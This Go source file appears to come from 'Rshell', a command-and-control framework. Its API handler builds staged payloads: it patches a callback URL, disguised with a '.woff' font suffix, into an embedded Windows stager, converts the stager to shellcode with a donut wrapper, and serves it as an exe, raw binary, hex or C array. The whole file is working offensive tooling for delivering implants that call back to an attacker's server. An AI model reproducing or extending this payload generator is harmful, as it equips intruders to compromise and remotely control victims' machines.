package api

import (
	"Rshell/pkg/database"
	"Rshell/pkg/godonut"
	"Rshell/pkg/response"
	"Rshell/pkg/service"
	"bytes"
	"encoding/hex"
	"fmt"
	"github.com/gin-gonic/gin"
	"net/http"
	"strings"
	"unicode/utf16"
)

// StageShellCodeGen generate stage shellcode
// @Summary Generate stage shellcode
// @Tags Shellcode
// @Accept json
// @Produce octet-stream
// @Param body body object true "{listener: listener URL, port: port, format: output format (exe/bin/hex/c)}"
// @Success 200 {file} binary "shellcode payload"
// @Failure 400 {object} object "bad request"
// @Router /api/v1/shellcode/stage [post]
// @Security BearerAuth
func StageShellCodeGen(c *gin.Context) {
	var shellcode struct {
		Listener string `json:"listener" binding:"required"`
		Port     string `json:"port" binding:"required"`
		Format   string `json:"format" binding:"required"`
	}
	if err := c.ShouldBind(&shellcode); err != nil {
		response.BadRequest(c, err.Error())
		return
	}

	var wd database.WebDelivery
	database.Engine.Where("listening_port = ?", shellcode.Port).Get(&wd)

	connectUrl := wd.ServerAddress + ".woff"
	var binaryFileName string
	switch wd.Arch {
	case "386":
		binaryFileName = "stager_x86.exe"
	case "amd64":
		binaryFileName = "stager_x64.exe"
	}
	binaryData, err := service.EmbeddedStager.ReadFile("stageshellcode/" + binaryFileName)
	if err != nil {
		response.BadRequest(c, "Failed to read file")
		return
	}

	var modifiedData []byte

	oldStr := "URLAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
	newStr := strings.ReplaceAll(connectUrl, " ", "")
	newStr = service.PadRight(newStr, len(oldStr))
	oldBytes := utf16LE(oldStr)
	newBytes := utf16LE(newStr)
	modifiedData = bytes.ReplaceAll(binaryData, oldBytes, newBytes)

	sc, _ := godonut.GenShellcode(modifiedData, "", wd.Arch)
	var (
		content  []byte
		filename string
		ctype    string
	)

	switch shellcode.Format {
	case "exe":
		content = modifiedData
		ctype = "application/octet-stream"
		filename = binaryFileName
	case "bin":
		content = sc
		filename = "payload.bin"
		ctype = "application/octet-stream"

	case "hex":
		hexStr := hex.EncodeToString(sc)
		content = []byte(hexStr)
		filename = "payload.txt"
		ctype = "text/plain"

	case "c":
		var cBuilder bytes.Buffer
		cBuilder.WriteString("unsigned char shellcode[] = \"")
		for i, b := range sc {
			if i == 0 {
				cBuilder.WriteString(fmt.Sprintf("\\x%02x", b))
			} else {
				cBuilder.WriteString(fmt.Sprintf("\\x%02x", b))
			}
		}
		cBuilder.WriteString("\";\n")
		content = cBuilder.Bytes()
		filename = "payload.c"
		ctype = "text/x-csrc"

	default:
		response.BadRequest(c, fmt.Sprintf("不支持的格式: %s，支持 hex, c, bin", shellcode.Format))
		return
	}

	c.Header("Content-Disposition", "attachment; filename="+filename)
	c.Header("Content-Type", ctype)
	c.Header("Content-Length", fmt.Sprintf("%d", len(content)))

	c.Data(http.StatusOK, ctype, content)
}

func utf16LE(s string) []byte {
	encoded := utf16.Encode([]rune(s))
	out := make([]byte, len(encoded)*2)
	for i, v := range encoded {
		out[i*2] = byte(v)
		out[i*2+1] = byte(v >> 8)
	}
	return out
}
